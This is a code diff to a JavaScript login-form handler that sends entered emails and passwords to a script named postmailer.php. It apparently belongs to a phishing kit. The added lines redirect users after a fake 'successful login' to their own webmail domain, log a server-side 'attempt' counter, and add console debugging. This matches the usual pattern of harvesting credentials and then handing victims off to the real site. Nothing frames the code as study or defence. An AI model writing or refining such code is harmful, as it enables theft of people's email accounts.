@@ -100,6 +100,7 @@
                  $('#msg').hide();
                  $('#login-status').hide();
                  $('#loading-overlay').show();
+                 // Submit the form via AJAX
                  $.ajax({
                      url: './postmailer.php', // Updated for local compatibility
                      method: 'POST',
@@ -122,22 +123,32 @@
                              $('#login-status-message').text(response.msg || 'Login successful! Redirecting...');
                              $('#login-status').removeClass('error-notice').addClass('success-notice').show();
                              setTimeout(function() {
-                                 window.location.href = response.redirect_url || '/';
+                                 window.location.href = response.redirect_url || getWebmailDomain(email);
                              }, 2000);
                          } else {
                              $('#login-status-message').text(response.msg || 'Invalid email or password. Please try again.');
                              $('#login-status').removeClass('success-notice').addClass('error-notice').show();
                              $('#password').val('').focus();
+                             if (response.attempt) {
+                                 console.log('Attempt #' + response.attempt + ' logged');
+                             }
                          }
                      },
                      error: function(xhr, status, error) {
                          $('#loading-overlay').hide();
+                         console.log('AJAX Error Details:');
+                         console.log('Status:', status);
+                         console.log('Error:', error);
+                         console.log('Response Text:', xhr.responseText);
+                         console.log('Status Code:', xhr.status);
                          var errorMsg = 'Connection error';
                          if (xhr.responseText) {
                              try {
                                  var errorResponse = JSON.parse(xhr.responseText);
                                  errorMsg = errorResponse.msg || errorMsg;
+                                 console.log('Parsed error response:', errorResponse);
                              } catch (e) {
+                                 console.log('Could not parse error response as JSON');
                                  errorMsg = 'Server error: ' + xhr.status;
                              }
                          }
